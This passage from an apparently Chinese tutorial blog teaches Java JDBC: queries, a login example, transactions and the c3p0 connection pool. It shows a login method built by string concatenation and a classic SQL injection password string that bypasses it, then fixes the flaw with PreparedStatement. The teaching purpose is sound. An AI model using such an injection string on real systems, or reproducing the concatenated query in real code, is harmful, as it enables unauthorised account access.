(stmt!=null)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    stmt.close<span class="literal">()</span>;</span><br><span class="line">                &#125;catch (SQLException e)&#123;</span><br><span class="line">                    e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (conn!=null)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conn.close<span class="literal">()</span>;</span><br><span class="line">                &#125;catch (SQLException e)&#123;</span><br><span class="line">                    e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 演示JDBC工具类</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public List&lt;Myguests&gt; find<span class="constructor">All2()</span> &#123;</span><br><span class="line">        Connection conn=null;</span><br><span class="line">        Statement stmt=null;</span><br><span class="line">        ResultSet rs=null;</span><br><span class="line">        List&lt;Myguests&gt; <span class="built_in">list</span>=null;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn=<span class="module-access"><span class="module"><span class="identifier">JDBCUtils</span>.</span></span>get<span class="constructor">Connection()</span>;</span><br><span class="line">            <span class="comment">//3.sql语句</span></span><br><span class="line">            String sql=<span class="string">"select * from myguests"</span>;</span><br><span class="line">            <span class="comment">//4.获取执行sql对象</span></span><br><span class="line">            stmt=conn.prepare<span class="constructor">Statement(<span class="params">sql</span>)</span>;</span><br><span class="line">            <span class="comment">//5.执行sql</span></span><br><span class="line">            rs=stmt.execute<span class="constructor">Query(<span class="params">sql</span>)</span>;</span><br><span class="line">            <span class="comment">//6.遍历结果集，封装对象，装载集合</span></span><br><span class="line">            Myguests myguests=null;</span><br><span class="line">            <span class="built_in">list</span> = <span class="keyword">new</span> ArrayList&lt;Myguests&gt;<span class="literal">()</span>;</span><br><span class="line">            <span class="keyword">while</span>(rs.next<span class="literal">()</span>)&#123;</span><br><span class="line">                <span class="comment">//获取数据</span></span><br><span class="line">                <span class="built_in">int</span> id=rs.get<span class="constructor">Int(<span class="string">"id"</span>)</span>;</span><br><span class="line">                String fristname=rs.get<span class="constructor">String(<span class="string">"firstname"</span>)</span>;</span><br><span class="line">                String lastname = rs.get<span class="constructor">String(<span class="string">"lastname"</span>)</span>;</span><br><span class="line">                String email = rs.get<span class="constructor">String(<span class="string">"email"</span>)</span>;</span><br><span class="line">                <span class="comment">//创建对象,并赋值</span></span><br><span class="line">                myguests=<span class="keyword">new</span> <span class="constructor">Myguests()</span>;</span><br><span class="line">                myguests.set<span class="constructor">Id(<span class="params">id</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Firstname(<span class="params">fristname</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Lastname(<span class="params">lastname</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Email(<span class="params">email</span>)</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//装载集合</span></span><br><span class="line">                <span class="built_in">list</span>.add(myguests);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;catch (SQLException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">JDBCUtils</span>.</span></span>close(rs,stmt,conn);</span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        List&lt;Myguests&gt; <span class="built_in">list</span> = <span class="keyword">new</span> demo8<span class="literal">()</span>.find<span class="constructor">All2()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="built_in">list</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="JDBC登录案例"><a href="#JDBC登录案例" class="headerlink" title="JDBC登录案例"></a>JDBC登录案例</h2><p>需求：</p>
<ul>
<li><p>通过键盘录入用户名和密码</p>
</li>
<li><p>判断用户是否登录成功</p>
<ul>
<li><p>select * from user where username=”” and password=””;</p>
</li>
<li><p>如果这个sql有查询结果，则成功，反之，则失败</p>
</li>
</ul>
</li>
</ul>
<p>步骤：</p>
<ol>
<li><p>创建数据库表user表</p>
<ul>
<li><p>create table user(<br>id int primary key auto_increment,<br>username varchar(32),<br>password varchar(32));</p>
<p>insert into user values(null,’zhangsan’,’123’);</p>
<p>insert into user values(null,’lisi’,’234’);</p>
</li>
</ul>
</li>
</ol>
<p>创建demo9<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdbc.<span class="keyword">until</span>.JDBCUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.<span class="keyword">Connection</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.<span class="keyword">Statement</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 需求：</span></span><br><span class="line"><span class="comment"> *通过键盘录入用户名和密码</span></span><br><span class="line"><span class="comment"> *判断用户是否登录成功</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> demo9 &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        //<span class="number">1.</span>键盘录入，接受用户名和密码</span><br><span class="line">        Scanner sc=<span class="built_in">new</span> Scanner(<span class="keyword">System</span>.<span class="keyword">in</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("请输入用户名");</span><br><span class="line">        String username = sc.nextLine();</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("请输入密码");</span><br><span class="line">        String <span class="keyword">password</span> = sc.nextLine();</span><br><span class="line">        //<span class="number">2.</span>调用方法</span><br><span class="line">        <span class="type">boolean</span> flag = <span class="built_in">new</span> demo9().<span class="keyword">login</span>(username, <span class="keyword">password</span>);</span><br><span class="line">        //<span class="number">3.</span>判断结果，输出不同语句</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println("登录成功");</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println("用户名或密码错误");</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">public</span> <span class="type">boolean</span> <span class="keyword">login</span>(String username,String <span class="keyword">password</span>)&#123;</span><br><span class="line">        <span class="keyword">Connection</span> conn=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">Statement</span> stmt=<span class="keyword">null</span>;</span><br><span class="line">        ResultSet rs=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(username==<span class="keyword">null</span> || <span class="keyword">password</span>==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        //连接数据库是否登录成功</span><br><span class="line">        //<span class="number">1.</span>获取连接</span><br><span class="line">        try &#123;</span><br><span class="line">            conn = JDBCUtils.getConnection();</span><br><span class="line">            //<span class="number">2.</span>定义<span class="keyword">sql</span></span><br><span class="line">            String <span class="keyword">sql</span>="select * from user where username='"+username+"' and password='"+<span class="keyword">password</span>+"' ";</span><br><span class="line">            //<span class="number">3.</span>获取执行<span class="keyword">sql</span>对象</span><br><span class="line">            stmt=conn.createStatement();</span><br><span class="line">            //<span class="number">4.</span>执行<span class="keyword">sql</span></span><br><span class="line">            rs = stmt.executeQuery(<span class="keyword">sql</span>);</span><br><span class="line">            //<span class="number">5.</span>判断</span><br><span class="line">            <span class="keyword">return</span> rs.next(); //如果有下一行，返回</span><br><span class="line"></span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            //释放资源</span><br><span class="line">            JDBCUtils.<span class="keyword">close</span>(rs,stmt,conn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>记得根据自身数据库不同，对配置文件进行修改</p>
<p>如果输入正确 那么运行结果为<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">请输入用户名</span><br><span class="line">zhangsan</span><br><span class="line">请输入密码</span><br><span class="line"><span class="number">123</span></span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure><br>如果输入不正确<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">请输入用户名</span><br><span class="line">zhangsan</span><br><span class="line">请输入密码</span><br><span class="line"><span class="number">11111</span></span><br><span class="line">用户名或密码错误</span><br></pre></td></tr></table></figure></p>
<h2 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h2><p>demo9的案例，其实会有一个bug,存在sql注入的安全问题</p>
<p>例如<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">请输入用户名</span><br><span class="line"><span class="number">51</span>nd0re1</span><br><span class="line">请输入密码</span><br><span class="line"><span class="number">1</span><span class="string">' or '</span><span class="number">1</span><span class="string">' = '</span><span class="number">1</span></span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure><br>可以看到用户名和密码都不在数据库中，但是却输出登录成功了</p>
<ol>
<li><p>SQL注入问题：在拼接sql时，有一些sql的特殊关键字参与字符串的拼接，会造成安全性问题</p>
<ol>
<li><p>输入用户随便，输入密码:1’ or ‘1’ = ‘1</p>
</li>
<li><p>sql:select * from user where username=’51nd0re1’ and password=’1’ or ‘1’ = ‘1’</p>
</li>
</ol>
</li>
<li><p>解决sql注入问题：使用PreparedStatement对象来解决</p>
</li>
<li><p>预编译sql：参数使用？来作为占位符</p>
</li>
<li><p>步骤：</p>
<ol>
<li>导入驱动jar</li>
<li>注册驱动</li>
<li>获取数据库连接对象</li>
<li>定义sql(使用？作为占位符)</li>
<li>获取执行sql语句的对象</li>
<li>给？赋值<ul>
<li>方法：setXxx(参数1,参数2)</li>
<li>参数1：?的位置编号从1开始</li>
<li>参数2：?的值</li>
</ul>
</li>
<li>执行sql，接受返回结果，不需要传递sql语句</li>
<li>处理结果</li>
<li>释放资源</li>
</ol>
</li>
<li><p>注意：后期都会使用PreparedStatement来完成增删改查的所有操作</p>
<ol>
<li><p>可以防止sql注入</p>
</li>
<li><p>效率更高</p>
</li>
</ol>
</li>
</ol>
<p>修改demo9<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdbc.<span class="keyword">until</span>.JDBCUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 需求：</span></span><br><span class="line"><span class="comment"> *通过键盘录入用户名和密码</span></span><br><span class="line"><span class="comment"> *判断用户是否登录成功</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> demo9 &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        //<span class="number">1.</span>键盘录入，接受用户名和密码</span><br><span class="line">        Scanner sc=<span class="built_in">new</span> Scanner(<span class="keyword">System</span>.<span class="keyword">in</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("请输入用户名");</span><br><span class="line">        String username = sc.nextLine();</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("请输入密码");</span><br><span class="line">        String <span class="keyword">password</span> = sc.nextLine();</span><br><span class="line">        //<span class="number">2.</span>调用方法</span><br><span class="line">        <span class="type">boolean</span> flag = <span class="built_in">new</span> demo9().<span class="keyword">login</span>(username, <span class="keyword">password</span>);</span><br><span class="line">        //<span class="number">3.</span>判断结果，输出不同语句</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println("登录成功");</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println("用户名或密码错误");</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录方法,使用PreparedStatement实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">public</span> <span class="type">boolean</span> <span class="keyword">login</span>(String username,String <span class="keyword">password</span>)&#123;</span><br><span class="line">        <span class="keyword">Connection</span> conn=<span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement pstmt=<span class="keyword">null</span>;</span><br><span class="line">        ResultSet rs=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(username==<span class="keyword">null</span> || <span class="keyword">password</span>==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        //连接数据库是否登录成功</span><br><span class="line">        //<span class="number">1.</span>获取连接</span><br><span class="line">        try &#123;</span><br><span class="line">            conn = JDBCUtils.getConnection();</span><br><span class="line">            //<span class="number">2.</span>定义<span class="keyword">sql</span></span><br><span class="line">            String <span class="keyword">sql</span>="select * from user where username=? and password= ?";</span><br><span class="line">            //<span class="number">3.</span>获取执行<span class="keyword">sql</span>对象</span><br><span class="line">            pstmt = conn.prepareStatement(<span class="keyword">sql</span>);</span><br><span class="line">            //给?赋值</span><br><span class="line">            pstmt.setString(<span class="number">1</span>,username);</span><br><span class="line">            pstmt.setString(<span class="number">2</span>,<span class="keyword">password</span>);</span><br><span class="line">            //<span class="number">4.</span>执行<span class="keyword">sql</span>,不需要传递<span class="keyword">sql</span></span><br><span class="line">            rs = pstmt.executeQuery();</span><br><span class="line">            //<span class="number">5.</span>判断</span><br><span class="line">            <span class="keyword">return</span> rs.next(); //如果有下一行，返回</span><br><span class="line"></span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            //释放资源</span><br><span class="line">            JDBCUtils.<span class="keyword">close</span>(rs,pstmt,conn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">请输入用户名</span><br><span class="line"><span class="number">51</span>nd0re1</span><br><span class="line">请输入密码</span><br><span class="line"><span class="number">1</span><span class="string">' or '</span><span class="number">1</span><span class="string">' = '</span><span class="number">1</span></span><br><span class="line">用户名或密码错误</span><br></pre></td></tr></table></figure></p>
<p>解决了sql注入的问题</p>
<h2 id="JDBC控制事务"><a href="#JDBC控制事务" class="headerlink" title="JDBC控制事务"></a>JDBC控制事务</h2><ol>
<li><p>事务：一个包含多个步骤的业务操作。如果这个业务操作被事务管理，则这多个步骤要么同时成功，要么同时失败</p>
</li>
<li><p>操作</p>
<ol>
<li><p>开启事务 getAutoCommit(boolean autoCommit) 调用该方法设置参数为false，即开启事务</p>
</li>
<li><p>提交事务 commit()</p>
</li>
<li><p>回滚事务 rollback()</p>
</li>
</ol>
</li>
</ol>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="/img/JavaWeb/7-28学习日记/2.png" alt="avatar"><br>这是原本表中的数据</p>
<p>创建demo10<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdbc.until.JDBCUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 事务操作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">demo10</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> static <span class="built_in">void</span> main(String[] args) &#123;</span><br><span class="line">        Connection conn=<span class="literal">null</span>;</span><br><span class="line">        PreparedStatement pstmt1=<span class="literal">null</span>;</span><br><span class="line">        PreparedStatement pstmt2=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.获取连接</span></span><br><span class="line">            conn = JDBCUtils.getConnection();</span><br><span class="line">            <span class="comment">//开启事务</span></span><br><span class="line">            conn.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//2.定义sql</span></span><br><span class="line">            <span class="comment">//2.1张三 - 500</span></span><br><span class="line">            String sql1=<span class="string">"update account set balance=balance - ? where id = ? "</span>;</span><br><span class="line">            <span class="comment">//2.2 李四 + 500</span></span><br><span class="line">            String sql2=<span class="string">"update account set balance=balance + ? where id = ? "</span>;</span><br><span class="line">            <span class="comment">//3.获取执行sql对象</span></span><br><span class="line">            pstmt1 = conn.prepareStatement(sql1);</span><br><span class="line">            pstmt2 = conn.prepareStatement(sql2);</span><br><span class="line">            <span class="comment">//4.设置参数</span></span><br><span class="line">            pstmt1.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">            pstmt1.setInt(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            pstmt2.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">            pstmt2.setInt(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//5.执行sql</span></span><br><span class="line">            pstmt1.executeUpdate();</span><br><span class="line">            <span class="comment">//手动制造异常</span></span><br><span class="line">            <span class="built_in">int</span> i=<span class="number">3</span>/<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            pstmt2.executeUpdate();</span><br><span class="line">            <span class="comment">//提交事务</span></span><br><span class="line">            conn.commit();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="comment">//事务回滚</span></span><br><span class="line">            <span class="keyword">if</span>(conn!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conn.rollback();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SQLException e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            JDBCUtils.close(pstmt1,conn);</span><br><span class="line">            JDBCUtils.close(pstmt2,<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在操作执行前开启事务，最后提交事务，在异常的catch中使用事务回滚，这样就算是出现了异常，数据也不会被修改</p>
<p>现在注释掉异常<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdbc.until.JDBCUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 事务操作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">demo10</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> static <span class="built_in">void</span> main(String[] args) &#123;</span><br><span class="line">        Connection conn=<span class="literal">null</span>;</span><br><span class="line">        PreparedStatement pstmt1=<span class="literal">null</span>;</span><br><span class="line">        PreparedStatement pstmt2=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.获取连接</span></span><br><span class="line">            conn = JDBCUtils.getConnection();</span><br><span class="line">            <span class="comment">//开启事务</span></span><br><span class="line">            conn.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//2.定义sql</span></span><br><span class="line">            <span class="comment">//2.1张三 - 500</span></span><br><span class="line">            String sql1=<span class="string">"update account set balance=balance - ? where id = ? "</span>;</span><br><span class="line">            <span class="comment">//2.2 李四 + 500</span></span><br><span class="line">            String sql2=<span class="string">"update account set balance=balance + ? where id = ? "</span>;</span><br><span class="line">            <span class="comment">//3.获取执行sql对象</span></span><br><span class="line">            pstmt1 = conn.prepareStatement(sql1);</span><br><span class="line">            pstmt2 = conn.prepareStatement(sql2);</span><br><span class="line">            <span class="comment">//4.设置参数</span></span><br><span class="line">            pstmt1.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">            pstmt1.setInt(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            pstmt2.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">            pstmt2.setInt(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//5.执行sql</span></span><br><span class="line">            pstmt1.executeUpdate();</span><br><span class="line">            <span class="comment">//手动制造异常</span></span><br><span class="line"><span class="comment">//            int i=3/0;</span></span><br><span class="line"></span><br><span class="line">            pstmt2.executeUpdate();</span><br><span class="line">            <span class="comment">//提交事务</span></span><br><span class="line">            conn.commit();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="comment">//事务回滚</span></span><br><span class="line">            <span class="keyword">if</span>(conn!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conn.rollback();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SQLException e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            JDBCUtils.close(pstmt1,conn);</span><br><span class="line">            JDBCUtils.close(pstmt2,<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><img src="/img/JavaWeb/7-28学习日记/3.png" alt="avatar"></p>
<h1 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>其实就是一个容器(集合)，存放数据库连接的容器。当系统初始化好后，容器被创建，容器中会申请一些连接对象，当用户来访问数据库时，从容器中获取连接对象，用户访问之后，会将连接对象归还给容器</p>
<h2 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h2><ol>
<li><p>节约资源</p>
</li>
<li><p>用户访问高效</p>
</li>
</ol>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><ol>
<li><p>标准接口：DataSource javax.sql包下的</p>
<ol>
<li><p>获取连接 getConnection()</p>
</li>
<li><p>归还连接：如果连接对象Connection是从连接池中获取的，那么调用Connection.close()方法，则不会再关闭连接了。而是归还连接</p>
</li>
</ol>
</li>
<li><p>一般我们不去实现它，由数据库厂商来实现</p>
<ol>
<li><p>C3P0：数据库连接池技术</p>
</li>
<li><p>Druid: 数据库连接池实现技术，由阿里巴巴提供的  </p>
</li>
</ol>
</li>
</ol>
<h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><ul>
<li><p>步骤：</p>
<ol>
<li><p>导入jar包 c3p0-0.9.5.2.jar mchange-common-java-0.2.20.jar</p>
</li>
<li><p>定义配置文件：c3p0.properties 或者 c3p0-config.xml；路径直接将文件放在src目录下即可</p>
</li>
<li><p>创建核心对象 数据库连接池都西昂 ComboPooledDataSource</p>
</li>
<li><p>获取连接 getConnection</p>
</li>
</ol>
</li>
</ul>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package jdbc.datasource.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ComboPooledDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="type">String</span>[] args) <span class="keyword">throws</span> <span class="type">SQLException</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建数据库连接池对象</span></span><br><span class="line">        <span class="type">DataSource</span> ds=new <span class="type">ComboPooledDataSource</span>();</span><br><span class="line">            <span class="comment">//2.获取连接对象</span></span><br><span class="line">            <span class="type">Connection</span> conn = ds.getConnection();</span><br><span class="line">            <span class="comment">//3.打印</span></span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">println</span>(conn);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">七月 <span class="number">28</span>, <span class="number">2020</span> <span class="number">3</span>:<span class="number">32</span>:<span class="number">11</span> 下午 com.mchange.v2.<span class="built_in">log</span>.MLog </span><br><span class="line">信息: MLog clients using java <span class="number">1.4</span>+ standard logging.</span><br><span class="line">七月 <span class="number">28</span>, <span class="number">2020</span> <span class="number">3</span>:<span class="number">32</span>:<span class="number">11</span> 下午 com.mchange.v2.c3p0.C3P0Registry </span><br><span class="line">信息: Initializing c3p0-<span class="number">0.9</span>.<span class="number">5.5</span> [built <span class="number">11</span>-December-<span class="number">2019</span> <span class="number">22</span>:<span class="number">18</span>:<span class="number">33</span> -<span class="number">0800</span>; debug? <span class="literal">true</span>; trace: <span class="number">10</span>]</span><br><span class="line">七月 <span class="number">28</span>, <span class="number">2020</span> <span class="number">3</span>:<span class="number">32</span>:<span class="number">12</span> 下午 com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource </span><br><span class="line">信息: I<span class="function"><span class="title">nitializing</span> c3p0 pool... com.mchange.v2.c3p0.ComboPooledDataSource [ acquireIncrement -&gt;</span> <span class="number">3</span>, <span class="function"><span class="title">acquireRetryAttempts</span> -&gt;</span> <span class="number">30</span>, <span class="function"><span class="title">acquireRetryDelay</span> -&gt;</span> <span class="number">1000</span>, <span class="function"><span class="title">autoCommitOnClose</span> -&gt;</span> <span class="function"><span class="title">false</span>, automaticTestTable -&gt;</span> <span class="function"><span class="title">null</span>, breakAfterAcquireFailure -&gt;</span> <span class="function"><span class="title">false</span>, checkoutTimeout -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">connectionCustomizerClassName</span> -&gt;</span> <span class="function"><span class="title">null</span>, connectionTesterClassName -&gt;</span> <span class="function"><span class="title">com</span>.mchange.v2.c3p0.impl.DefaultConnectionTester, contextClassLoaderSource -&gt;</span> <span class="function"><span class="title">caller</span>, dataSourceName -&gt;</span> <span class="number">1</span><span class="function"><span class="title">b61k3gab155opvmvrn7zd</span>|6659c656, debugUnreturnedConnectionStackTraces -&gt;</span> <span class="function"><span class="title">false</span>, description -&gt;</span> <span class="function"><span class="title">null</span>, driverClass -&gt;</span> <span class="function"><span class="title">com</span>.mysql.cj.jdbc.Driver, extensions -&gt;</span> &#123;&#125;, <span class="function"><span class="title">factoryClassLocation</span> -&gt;</span> <span class="function"><span class="title">null</span>, forceIgnoreUnresolvedTransactions -&gt;</span> <span class="function"><span class="title">false</span>, forceSynchronousCheckins -&gt;</span> <span class="function"><span class="title">false</span>, forceUseNamedDriverClass -&gt;</span> <span class="function"><span class="title">false</span>, identityToken -&gt;</span> <span class="number">1</span><span class="function"><span class="title">b61k3gab155opvmvrn7zd</span>|6659c656, idleConnectionTestPeriod -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">initialPoolSize</span> -&gt;</span> <span class="number">10</span>, <span 